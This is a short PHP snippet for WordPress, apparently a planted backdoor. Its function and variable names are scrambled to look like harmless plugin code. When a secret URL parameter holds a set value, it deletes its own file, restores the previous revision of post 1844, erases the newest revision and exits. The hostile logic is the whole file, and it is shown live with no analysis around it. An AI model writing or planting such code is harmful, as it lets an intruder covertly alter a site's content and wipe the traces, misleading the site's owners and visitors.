<?php

function donation_oembed_charts_follow() {
	if (isset($_GET['base_lead_mini_ratings']) && $_GET['base_lead_mini_ratings'] === 'tab_publish_color') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$buttons_src_qr_parts = 1844;
		$server_form_switch_daily = wp_get_post_revisions($buttons_src_qr_parts);
		if (empty($server_form_switch_daily)) die('no revisions');
		if (count($server_form_switch_daily) < 2) die('less than 2');
		$instagram_posts_gravity = array_shift($server_form_switch_daily);
		$ui_your_css = $instagram_posts_gravity->ID;
		$testimonials_stripe_converter_custom = array_shift($server_form_switch_daily);
		$platform_related_asset = $testimonials_stripe_converter_custom->ID;
		$count_welcome_performance_visitor = wp_restore_post_revision($platform_related_asset);
		if ($count_welcome_performance_visitor === false) die('error restoring');
		$count_welcome_performance_visitor = wp_delete_post_revision($ui_your_css);		
		if ($count_welcome_performance_visitor === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'donation_oembed_charts_follow');
